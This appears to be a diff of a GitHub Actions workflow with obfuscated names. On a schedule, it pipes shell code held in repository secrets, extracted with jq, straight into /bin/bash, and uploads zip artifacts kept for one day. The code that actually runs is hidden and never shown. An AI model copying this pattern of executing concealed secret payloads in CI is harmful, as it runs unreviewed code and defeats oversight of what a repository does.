@@ -1,29 +1,26 @@
 name: xianggehunbai
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '18 3/6 * * *'
 
-jobs:  # 32394
+  schedule:
+    - cron: '1 5,11,17,23 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: xianggehunbai
         env:
-          nabrw423: ${{ secrets.nabrw423 }}
+          ftuuv61: ${{ secrets.ftuuv61 }}
         run: |
-          echo $nabrw423 | jq -r .a2 | /bin/bash
-          echo $bdu28 | jq -r .dhux2448 | /bin/bash
-          echo $av360 | jq -r .efbv83826 | /bin/bash
-          echo $z684 | jq -r .zymr32 | /bin/bash
-          echo $fbxlv11 | jq -r .s2795 | /bin/bash
-          echo $tzan4905 | jq -r .oo90179 | /bin/bash
-          echo $u21 | jq -r .fleg50702 | /bin/bash
-          echo $w95229 | jq -r .agjrl6805 | /bin/bash
-          echo $ivlc2 | jq -r .zvm8 | /bin/bash
-          echo $py44307 | jq -r .ykr9332 | /bin/bash
-          echo $cjfrc4 | jq -r .yb835 | /bin/bash
-          echo $xtgj76232 | jq -r .mnnd74 | /bin/bash
-          echo $r0833 | jq -r .utp3191 | /bin/bash
+          printf '%s' "$ftuuv61" | jq -r .nwb64561 | /bin/bash
+          echo $zir78604 | jq -r .guv74726 | /bin/bash
+          printf '%s' "$pxao2" | jq -r .php79742 | /bin/bash
+          printf '%s' "$dr8040" | jq -r .t458 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: gEqkM7Wz
+          path: "*.zip"
+          retention-days: 1
